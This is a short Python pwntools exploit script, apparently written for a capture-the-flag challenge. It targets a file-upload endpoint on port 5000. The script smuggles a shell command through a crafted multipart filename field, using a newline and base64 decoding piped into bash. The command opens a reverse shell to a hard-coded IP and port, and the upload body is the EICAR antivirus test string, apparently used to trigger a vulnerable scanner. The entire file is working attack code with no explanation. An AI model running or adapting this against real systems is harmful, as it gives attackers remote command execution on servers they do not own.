import sys
from base64 import b64encode
from pwn import *


host = sys.argv[1]

r = remote(host, 5000)
cmd = 'bash -i >& /dev/tcp/10.26.0.34/12345  0>&1'

payload = '''------WebKitFormBoundaryKcb4DTSKRRV0dcTH
Content-Disposition: form-data; name="file"; filename*=utf-8''a%0a~!%20echo%20<payload>|base64%20-d|bash%0a<random>.png

X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
------WebKitFormBoundaryKcb4DTSKRRV0dcTH--'''.replace('<random>', randoms(12)).replace('<payload>', b64encode(cmd))

r.send('''POST /upload HTTP/1.1
Host: 10.26.0.34:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKcb4DTSKRRV0dcTH
Content-Length: %d

%s
''' % (len(payload), payload))